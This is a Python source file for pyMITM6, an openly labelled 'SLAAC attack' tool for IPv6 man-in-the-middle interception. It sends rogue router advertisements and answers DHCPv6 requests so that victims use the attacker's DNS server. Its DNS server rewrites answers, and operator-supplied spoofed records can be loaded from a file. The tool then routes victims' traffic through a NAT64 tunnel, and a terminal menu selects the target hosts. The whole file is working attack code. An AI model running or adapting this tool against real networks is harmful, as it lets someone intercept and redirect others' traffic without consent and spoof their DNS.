#!/usr/bin/python

#pyMITM6, SLAAC Attack tool
#Copyright (C) 2013  SUDKI Karim

#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import curses
import curses.wrapper
import threading
import os
import subprocess
import csv
from fcntl import ioctl
from struct import pack
from threading import Event
from argparse import ArgumentParser
from time import gmtime, mktime, time, sleep
from lib.IPy import IP
from lib.dnslib import *


class TUI(object):
    """
    Handles the Terminal User Interface
    """

    def __init__(self, scr):
        """
        Initialize the screen
        """
        self.message = ''
        self.scr = scr
        self.scr.border(0)
        self.init_curses()
        self.menu = {}
        self.pointers = {'c': 0, 'o': 0}
        self.max_y, self.max_x = self.scr.getmaxyx()
        self.max_host = self.max_y - 13
        self.draw_header()
        self.draw_footer()
        self.draw_body()
        self.handle_keys()

    def draw_body(self):
        """
        Draw the body of the screen (hosts list)
        """
        if len(d_hosts) > 0:
            self.menu = list(d_hosts)
            i = 6
            for element in self.menu[self.pointers['o']:self.pointers['o'] + self.max_host]:
                host = element.ljust(40) + ('[' + d_hosts[element].ljust(1) + ']').ljust(10)
                if element in m_hosts:
                    host += m_hosts[element]
                else:
                    get_mac(element)
                if element == self.get_current():
                    self.scr.addstr(i, 2, host, curses.color_pair(1))
                else:
                    self.scr.addstr(i, 2, host)
                i += 1
            self.scr.refresh()

    def draw_footer(self):
        """
        Draw the footer
        """
        self.scr.hline(self.max_y - 5, 1, '-', self.max_x - 2)
        self.scr.addstr(self.max_y - 4, 2, "Press < r > to reload DNS file".ljust(40) + self.message)
        self.scr.addstr(self.max_y - 3, 2, "Press < Space > to select")
        self.scr.addstr(self.max_y - 2, 2, "Press < q > to exit")

    def draw_header(self):
        """
        Draw the header
        """
        self.scr.addstr(2, 2, "pyMITM6 - Target Selection ")
        self.scr.hline(4, 1, '-', self.max_x - 2)
        self.scr.addstr(5, 2, "IPv6 Targets".ljust(40) + "Selected".ljust(10) + "MAC Address")

    def get_current(self):
        """
        Return current selected item in the list
        """
        return self.menu[self.pointers['c']]

    def handle_keys(self):
        """
        Handle the keystrokes
        """
        self.scr.nodelay(1)
        while True:
            key = self.scr.getch()
            if key == curses.KEY_UP:
                self.navigate_up()
            elif key == curses.KEY_DOWN:
                self.navigate_down()
            elif key == ord('r'):
                if dns_file is not None:
                    self.message = load_dns(dns_file)
                    self.draw_footer()
                else:
                    self.message = "Cannot reload file"
                    self.draw_footer()
            elif key == ord('q'):
                break
            elif key == ord(' '):
                self.set_value()
            Event().wait(0.01)
            self.draw_body()

    @staticmethod
    def init_curses():
        """
        Setup curses environment
        """
        curses.curs_set(0)
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_RED, -1)

    def navigate_up(self):
        """
        Navigate up the list
        """
        if self.pointers['c'] > 0:
            self.pointers['c'] -= 1
            if self.pointers['c'] <= self.pointers['o'] and self.pointers['o'] > 0:
                self.pointers['o'] -= 1
        elif self.pointers['c'] == 0:
            self.pointers['c'] = len(self.menu) - 1
            self.pointers['o'] = self.pointers['c'] - self.max_host + 1

    def navigate_down(self):
        """
        Navigate down the list
        """
        if self.pointers['c'] < len(self.menu) - 1:
            self.pointers['c'] += 1
            if self.pointers['c'] > self.max_host - 1:
                self.pointers['o'] += 1
        elif self.pointers['c'] == len(self.menu) - 1:
            self.pointers['c'] = 0
            self.pointers['o'] = 0

    def set_value(self):
        """
        Set the value to 'x' for the selected item
        """
        if len(d_hosts) > 0:
            if d_hosts[self.get_current()] == 'x':
                d_hosts[self.get_current()] = ''
            else:
                d_hosts[self.get_current()] = 'x'


def load_dns(filename):
    if filename is not None:
        try:
            r = open(filename, "rb")
            for row in csv.reader(r):
                try:
                    IP(row[1])
                    dns_hosts[row[0]] = row[1]
                except:
                    pass
            r.close()
            return "Success"
        except IOError:
            return "IO Error"


def get_mac_addr(ifname):
    """
    Return MAC address from interface name
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # SIOCSIFHWADDR= 0x8927
    mac = ioctl(s.fileno(), 0x8927, pack('256s', ifname[:15]))
    return ''.join(['%02x:' % ord(char) for char in mac[18:24]])[:-1]


def get_ll_addr(ifname, index, port):
    """
    Return a 4 tuple with local-link address from interface name, port, scope and interface index
    """
    f = open("/proc/net/if_inet6", "r")
    for line in f:
        l = line.split()
        if l[0].startswith('fe80') and l[5] == ifname:
            hp = []
            for s in range(0, len(l[0]), 4):
                hp.append(l[0][s:s + 4])
            return ':'.join(hp), port, 0, index


def get_if_index(ifname):
    """
    Return the interface index from interface name
    @rtype : object
    @param ifname:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # SIOCGIFINDEX 0x8933
    info = ioctl(s.fileno(), 0x8933, pack('256s', ifname[:15]))
    return ord(info[16])


def init_pool(pool):
    """
    Initialize a pool of ipv4 addresses for NAT64
    """
    ip = IP(pool)
    for x in ip:
        if x != ip.broadcast() and x != ip.net():
            p_hosts.append(x.strNormal())


def checksum(data):
    """
    Return the checksum of the data
    """
    data_hex = ''.join(data).decode("hex")
    data_len = len(data_hex)
    crc = 0
    for i in range(0, data_len, 2):
        part = data_hex[i:i + 2]
        # padding with 0's to complete checksum calculation
        if len(part) < 2:
            part += '\x00'
        val = int(part.encode('hex'), 16)
        crc = (crc + val) % 0xFFFF
    crc = ~crc & 0xFFFF
    return list(pack('>H', crc).encode("hex"))


def get_mac(ip):
    try:
        output = subprocess.Popen(["ip", "neigh"], stdout=subprocess.PIPE).communicate()[0]
        for x in output.splitlines(False):
            if x.split()[0] == ip:
                m_hosts[ip] = x.split()[4]
                break
            else:
                m_hosts[ip] = ''
    except:
        pass


#create tun device
def mktun():
    """
    Create the TUN DEVICE
    """
    # FLAG TO USE TUN
    tunsetiff = 0x400454ca
    # FLAG TO SET IF PERSISTENT
    tunsetpersist = tunsetiff + 1
    # FLAG TO SET OWNER PERMISSION ON IF
    #tunsetowner = tunsetiff + 2
    # FLAG TO SET GROUP PERMISSION ON IF
    #tunsetgroup = tunsetiff + 4
    # INTERFACE TYPE TUN
    iff_tun = 0x0001
    # NO PACKET INFORMATION
    iff_no_pi = 0x1000
    # MODE = TYPE TUNNEL AND NO PACKET INFORMATION
    if_mode = iff_tun | iff_no_pi
    # OPEN FD FOR TUN DEVICE
    tun_device = open('/dev/net/tun', 'r+b')
    # SET DEVICE NAME AND INTERFACE MODE
    ifr = pack('16sH', tun_name, if_mode)
    ioctl(tun_device, tunsetiff, ifr)
    # SET INTERFACE PERSISTENT
    ioctl(tun_device, tunsetpersist, 1)
    # SET OWNER
    #ioctl(tun_device, tunsetowner, 1000)
    # SET GROUP
    #ioctl(tun_device, tunsetgroup, 1000)

    return tun_device


class DHCPsrv(threading.Thread):
    """
    Handle DHCPv6 Information-request
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_UDP)
        self.group = socket.inet_pton(socket.AF_INET6, "ff02::1:2") + pack('@I', 0)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, self.group)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 0)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 1)
        self.sock.bind(get_ll_addr(phy_int, int_index, 547))

    def run(self):
        while not self.kill_received:
            try:
                data, addr = self.sock.recvfrom(4096)
                host = addr[0].split('%')[0]
                if host not in d_hosts and host.startswith('fe80'):
                    d_hosts[host] = ''
                    get_mac(host)
                if d_hosts[host] == 'x':
                    data = data.encode("hex")
                    srcp = data[:4]
                    dstp = data[4:8]
                    msgtype = data[16:18]
                    src = socket.inet_pton(socket.AF_INET6, ll_add).encode("hex")
                    host = socket.inet_pton(socket.AF_INET6, host).encode("hex")
                    if srcp == '0222' and dstp == '0223' and msgtype == '0b':
                        trid = data[18:24]
                        b = 24
                        h = 28
                        l = 0
                        option = ''
                        while option != '0001':
                            option = data[b:h]
                            b += 4
                            h += 4
                            l = int(data[b:h], 16) * 2
                            if l == 0:
                                b += 4
                                h += 4
                            else:
                                b += 4 + l
                                h += 4 + l
                        clid = data[b - l - 8:b]
                        sid = '0002000e00010001' + hex(int(self.dhcp_time()))[2:] + ll_int.replace(':', '')
                        rdns = '00170010' + rtr_dns6
                        resp = list(dstp + srcp + '0' * 8 + '07' + trid + clid + sid + rdns)
                        resp[8:12] = list(hex(len(resp) / 2)[2:].zfill(4))
                        pseudo = list(src) + list(host) + list(hex(len(resp) / 2)[2:].zfill(4)) + 6 * ['0'] + 2 * ['1']
                        pseudo += resp
                        resp[12:16] = checksum(pseudo)
                        self.sock.sendto(''.join(resp).decode("hex"), addr)
                    else:
                        pass
            except:
                continue

    @staticmethod
    def dhcp_time():
        """
        Calculate time for DHCPv6
        """
        epoch = (2000, 1, 1, 0, 0, 0, 5, 1, 0)
        delta = mktime(epoch) - mktime(gmtime(0))
        timeval = time() - delta
        return timeval


class RAsrv(threading.Thread):
    """
    Handle Router Solicitation and Router Advertisement (In Reply)
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        self.group = socket.inet_pton(socket.AF_INET6, "ff02::2")
        self.mreq = self.group + pack('@I', 0)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, self.mreq)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 0)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 0xff)
        self.sock.bind(get_ll_addr(phy_int, int_index, 0))

    def run(self):
        while not self.kill_received:
            try:
                data, addr = self.sock.recvfrom(1024)
                host = addr[0].split('%')[0]
                if host not in d_hosts and host.startswith('fe80'):
                    d_hosts[host] = ''
                    get_mac(host)
                data = data.encode("hex")[:2]
                if data == '85':
                    self.sock.sendto(ra_data.decode("hex"), (host, 0))
            except:
                continue


class RAtimersrv(threading.Thread):
    """
    Handle Router Advertisement (periodically)
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        self.group = socket.inet_pton(socket.AF_INET6, "ff02::1")
        self.mreq = self.group + pack('@I', 0)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, self.mreq)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 0)
        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 0xff)
        self.sock.bind(get_ll_addr(phy_int, int_index, 0))

    def run(self):
        while not self.kill_received:
            try:
                self.sock.sendto(ra_data.decode("hex"), ("ff02::1", 0))
                Event().wait(30)
            except:
                continue


class DNSsrv(threading.Thread):
    """
    Handle DNS queries and answers (A & AAAA)
    """

    def __init__(self, addr):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.server = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((addr, 53, 0, 0))
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def run(self):
        while not self.kill_received:
            data, addr = self.server.recvfrom(1024)
            try:
                d = DNSRecord.parse(data)
                if d.header.qr == 0:
                    if d.q.qtype == 1:
                        name = str(d.q.qname)
                        if name in dns_hosts:
                            reply = DNSRecord(DNSHeader(qr=1, aa=0, ra=1, rd=1, id=d.header.id), q=DNSQuestion(name), a=RR(name, rdata=A(dns_hosts[name]), ttl=30))
                            reply = reply.pack()
                        else:
                            self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            self.client.sendto(data, (dns_v4, 53))
                            reply = self.client.recv(1024)
                            self.client.close()
                        self.server.sendto(reply, addr)
                    elif d.q.qtype == 28:
                        name = str(d.q.qname)
                        if name in dns_hosts:
                            r = DNSRecord(DNSHeader(qr=1, aa=0, ra=1, rd=1, id=d.header.id), q=DNSQuestion(name), a=RR(name, rdata=A(dns_hosts[name]), ttl=30))
                        else:
                            d.q.qtype = 1
                            self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            self.client.sendto(d.pack(), (dns_v4, 53))
                            reply = self.client.recv(1024)
                            self.client.close()
                            r = DNSRecord.parse(reply)
                        r.q.qtype = 28
                        for y in range(len(r.rr)):
                            if r.rr[y].rtype == 1:
                                r.rr[y].rtype = 28
                                i = socket.inet_pton(socket.AF_INET6, bad_prefix + str(r.rr[y].rdata)).encode("hex")
                                r.rr[y].rdata = AAAA([int(i[x:x+2], 16) for x in range(0, len(i), 2)])
                        self.server.sendto(r.pack(), addr)
            except:
                continue


class V4:
    """
    Class for IPv4 packet handling (NAT64)
    """

    def __init__(self, packet=['0'] * 40):
        self.ver = packet[0]
        self.ihl = packet[1]
        self.tos = packet[2:4]
        self.tol = packet[4:8]
        self.id = packet[8:12]
        self.flags_frag = packet[12:16]
        self.ttl = packet[16:18]
        self.prot = packet[18:20]
        self.chksum = packet[20:24]
        self.src = packet[24:32]
        self.dst = packet[32:40]
        self.payload = packet[40:len(packet)]

    def h_raw(self):
        """
        Return raw header of the packet (without payload)
        """
        return list(self.ver) + list(self.ihl) + self.tos + self.tol + self.id + self.flags_frag + self.ttl + self.prot + self.chksum + self.src + self.dst

    def p_raw(self):
        """
        Return all the packet (with payload)
        """
        return self.h_raw() + self.payload

    def p_pseudo(self):
        """
        Generate a pseudo header and checksum calculation (TCP/UDP)
        """
        if self.prot == ['0', '6']:
            self.payload[32:36] = ['0', '0', '0', '0']
            self.payload[32:36] = checksum(self.src + self.dst + ['0', '0'] + self.prot + list(hex(int(''.join(self.tol), 16)-int(self.ihl)*4)[2:].zfill(4))+self.payload)
        elif self.prot == ['1', '1']:
            self.payload[12:16] = ['0', '0', '0', '0']
            self.payload[12:16] = checksum(self.src + self.dst + ['0', '0'] + self.prot + list(hex(int(''.join(self.tol), 16)-int(self.ihl)*4)[2:].zfill(4))+self.payload)

    def v4tov6hdr(self, p):
        """
        Convert an IPv4 packet in IPv6
        """
        p.ver = '6'
        p.tc = self.tos
        p.fl = ['0', '0', '0', '0', '0']
        p.pl = list(hex(int(''.join(self.tol), 16) - int(self.ihl) * 4)[2:].zfill(4))
        p.hl = self.ttl
        p.payload = self.payload

        # ICMP packet ?
        if self.prot == ['0', '1']:
            p.nh = ['3', 'a']
            # ICMP Type 0 --> 129
            if self.payload[:2] == ['0', '0']:
                p.payload[:2] = ['8', '1']
            # ICMP Type 8 --> 128
            elif self.payload[:2] == ['0', '8']:
                p.payload[:2] = ['8', '0']
            elif self.payload[:2] == ['0', '3']:
                #Code 0,1 --> 0
                if self.payload[2:4] == ['0', '0'] or self.payload[2:4] == ['0', '1']:
                    p.payload[:2] = ['0', '1']
                    p.payload[2:4] = ['0', '0']
                #Code 2 --> type:4 code:1
                elif self.payload[2:4] == ['0', '2']:
                    p.payload[:2] = ['0', '4']
                    p.payload[2:4] = ['0', '1']
                #Code 3 --> code:4
                elif self.payload[2:4] == ['0', '3']:
                    p.payload[2:4] = ['0', '4']
                #Code 4 --> type:2 code:0
                elif self.payload[2:4] == ['0', '4']:
                    p.payload[:2] = ['0', '2']
                    p.payload[2:4] = ['0', '0']
                #Code 5,6,7,8 --> code:0
                elif self.payload[2:4] == ['0', '5'] or self.payload[2:4] == ['0', '6'] or self.payload[2:4] == ['0', '7'] or self.payload[2:4] == ['0', '8']:
                    p.payload[2:4] = ['0', '0']
                elif self.payload[2:4] == ['0', '9'] or self.payload[2:4] == ['0', 'a']:
                    p.payload[2:4] = ['0', '1']
                elif self.payload[2:4] == ['0', 'b'] or self.payload[2:4] == ['0', 'c']:
                    p.payload[2:4] = ['0', '0']
                elif self.payload[2:4] == ['0', 'd'] or self.payload[2:4] == ['0', 'f']:
                    p.payload[2:4] = ['0', '1']
            elif self.payload[:2] == ['0', 'b']:
                p.payload[:2] = ['0', '3']
            elif self.payload[:2] == ['0', 'c']:
                p.payload[:2] = ['0', '4']
            # ICMP Type 4,5,6,9,10,13,14,15,16,17,18 --> drop (to be implemented)
        else:
            # TCP/UDP packet?
            p.nh = self.prot
        # Append fake prefix to ipv4
        p.src = list(fake_prefix[:-8]) + self.src
        # Find destination IPv6 ip in NAT table
        for v6 in n_hosts:
            if n_hosts[v6] == self.dst:
                p.dst = list(v6)
        # Generate pseudo header and calculate checksum
        p.p_pseudo()


class V6:
    """
    Class for IPv6 packet handling (NAT64)
    """

    def __init__(self, packet=['0'] * 80):
        self.ver = packet[0]
        self.tc = packet[1:3]
        self.fl = packet[3:8]
        self.pl = packet[8:12]
        self.nh = packet[12:14]
        self.hl = packet[14:16]
        self.src = packet[16:48]
        self.dst = packet[48:80]
        self.payload = packet[80:len(packet)]

    def hraw(self):
        """
        Return raw header of the packet (without payload)
        """
        return list(self.ver) + self.tc + self.fl + self.pl + self.nh + self.hl + self.src + self.dst

    def p_raw(self):
        """
        Return all the packet (with payload)
        """
        return self.hraw() + self.payload

    def p_pseudo(self):
        """
        Generate a pseudo header and checksum calculation (TCP/UDP/ICMPv6)
        """
        if self.nh == ['3', 'a']:
            self.payload[4:8] = ['0', '0', '0', '0']
            self.payload[4:8] = checksum(self.src + self.dst + list(''.join(self.pl).zfill(8)) + ['0', '0', '0', '0', '0', '0'] + self.nh + self.payload)
        elif self.nh == ['0', '6']:
            self.payload[32:36] = ['0', '0', '0', '0']
            self.payload[32:36] = checksum(self.src + self.dst + list(''.join(self.pl).zfill(8)) + ['0', '0', '0', '0', '0', '0'] + self.nh + self.payload)
        elif self.nh == ['1', '1']:
            self.payload[12:16] = ['0', '0', '0', '0']
            self.payload[12:16] = checksum(self.src + self.dst + list(''.join(self.pl).zfill(8)) + ['0', '0', '0', '0', '0', '0'] + self.nh + self.payload)

    def v6tov4hdr(self, p):
        """
        Convert an IPv6 packet in IPv4
        """
        p.ver = '4'
        p.ihl = '5'
        p.tos = self.tc
        p.tol = list(hex(int(''.join(self.pl), 16) + 20)[2:].zfill(4))
        p.id = ['0', '0', '0', '0']
        p.flags_frag = ['4', '0', '0', '0']
        p.ttl = self.hl
        p.payload = self.payload
        p.dst = self.dst[24:32]
        if self.nh == ['3', 'a']:
            p.prot = ['0', '1']
            if p.payload[:2] == ['8', '0']:
                p.payload[:2] = ['0', '8']
                p.payload[4:8] = ['0', '0', '0', '0']
                p.payload[4:8] = checksum(p.payload)
        else:
            p.prot = self.nh
            p.p_pseudo()
        p.chksum = checksum(p.h_raw())


class NAT64(threading.Thread):
    """
    Handle translation IPv4 <--> IPv6
    """
    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.tun_device = mktun()

    def run(self):
        while not self.kill_received:
            try:
                packet = list(os.read(self.tun_device.fileno(), 1500).encode("hex"))
                if packet[0] == '4':
                    n = V4(packet)
                    x = V6()
                    n.v4tov6hdr(x)
                    s = ''.join(x.p_raw())
                    os.write(self.tun_device.fileno(), s.decode("hex"))
                elif packet[0] == '6':
                    n = V6(packet)
                    x = V4()
                    v6_source = ''.join(n.src)
                    if v6_source in n_hosts:
                        x.src = list(n_hosts[v6_source])
                        n.v6tov4hdr(x)
                        s = ''.join(x.p_raw())
                        os.write(self.tun_device.fileno(), s.decode("hex"))
                    else:
                        v4_source = get_ip()
                        if not v4_source:
                            break
                        else:
                            n_hosts[v6_source] = v4_source
                            x.src = list(v4_source)
                            n.v6tov4hdr(x)
                            s = ''.join(x.p_raw())
                            os.write(self.tun_device.fileno(), s.decode("hex"))
            except:
                continue


# get an empty entry in the pool for tun device (each new ipv6)
def get_ip():
    """
    Returns a free ipv4 in the pool for tun device (each new ipv6)
    @rtype : list
    """
    try:
        return list(''.join([hex(int(h))[2:].zfill(2) for h in p_hosts.pop().split('.')]))
    except:
        return None


if __name__ == '__main__':
    parser = ArgumentParser(description='pyMITM6 - SLAAC attack')
    parser.add_argument('-c', action="store", dest="dns_file", type=str, help="DNS file (comma separated)")
    parser.add_argument('-int', action="store", dest="phy_int", type=str, help="Physical Interface Name")
    parser.add_argument('-dns4', action="store", dest="dns_v4", type=str, help="IPv4 DNS Server")
    parser.add_argument('-dns6', action="store", dest="dns_v6", type=str, help="IPv6 DNS Proxy")
    parser.add_argument('-good', action="store", dest="good_prefix", type=str, help="GOOD prefix (CIDR)")
    parser.add_argument('-bad', action="store", dest="bad_prefix", type=str, help="BAD prefix (CIDR)")
    parser.add_argument('-pool', action="store", dest="ip_pool", type=str, help="IPv4 pool for NAT64 (CIDR)")
    parser.add_argument('-tun', action="store", dest="tun_name", type=str, help="TUN Interface Name", required=True)
    parser.add_argument('--mktun', action="store_true", dest="action", help="Create TUN interface")
    result = parser.parse_args()

    tun_name = result.tun_name
    if result.action:
        mktun()
        print "TUN interface created successfully"
        exit()
    else:
        if not result.phy_int:
            print "NO PHY interface specified !"
            exit()
        elif not result.dns_v4:
            print "NO DNS server (IPv4) specified !"
            exit()
        elif not result.dns_v6:
            print "NO DNS server (IPv6) specified !"
            exit()
        elif not result.good_prefix:
            print "NO GOOD IPV6 Prefix specified !"
            exit()
        elif not result.bad_prefix:
            print "NO BAD IPV6 Prefix specified !"
            exit()
        elif not result.ip_pool:
            print "NO IP pool specified !"
            exit()
        if not result.dns_file:
            dns_file = None
        else:
            dns_file = result.dns_file
    ip_pool = result.ip_pool
    dns_v4 = result.dns_v4
    dns_v6 = result.dns_v6
    good_prefix, rtr_prefix_len = result.good_prefix.split('/')
    bad_prefix = result.bad_prefix.split('/')[0]
    phy_int = result.phy_int

    # Dict of Detected targets
    d_hosts = {}
    m_hosts = {}

    # list of free IPv4 (pool)
    p_hosts = []

    # Dict of hosts using nat ipv6:ipv4
    n_hosts = {}

    # Dict for custom dns records
    dns_hosts = {}

    # Table of threads
    threads = []

    # Several inits
    int_index = get_if_index(phy_int)
    ll_int = get_mac_addr(phy_int)
    ll_add = get_ll_addr(phy_int, int_index, 0)[0]

    # Router lifetime
    rtr_life = '30'

    # Several Inits
    # good prefix
    rtr_prefix = socket.inet_pton(socket.AF_INET6, good_prefix).encode("hex")
    # dns ipv6
    rtr_dns6 = socket.inet_pton(socket.AF_INET6, dns_v6).encode("hex")
    # bad prefix
    fake_prefix = socket.inet_pton(socket.AF_INET6, bad_prefix).encode("hex")

    # Router Advertisement Generation
    ra_data = '860000004040' + hex(int(rtr_life))[2:].zfill(4) + 16 * '0' + '0304'
    ra_data += hex(int(rtr_prefix_len))[2:].zfill(2) + 'c0000151800000384000000000' + rtr_prefix
    ra_data += '190300000000001e' + rtr_dns6 + '0101' + ll_int.replace(':', '')

    # Pool Initialization
    init_pool(ip_pool)

    # Load DNS file
    if dns_file is not None:
        load_dns(dns_file)

    # Append threads to a table
    threads.append(DNSsrv(dns_v6))
    threads.append(DHCPsrv())
    threads.append(RAsrv())
    threads.append(RAtimersrv())
    threads.append(NAT64())

    # Demonize and start thread one by one
    for thread in threads:
        thread.daemon = True
        thread.start()
        sleep(0.5)

    # Start Terminal User Interface
    try:
        curses.wrapper(TUI)
    except KeyboardInterrupt:
    # If error occurs, kill all threads
        print "Ctrl-c received! Sending kill to threads..."
        for t in threads:
            t.kill_received = True
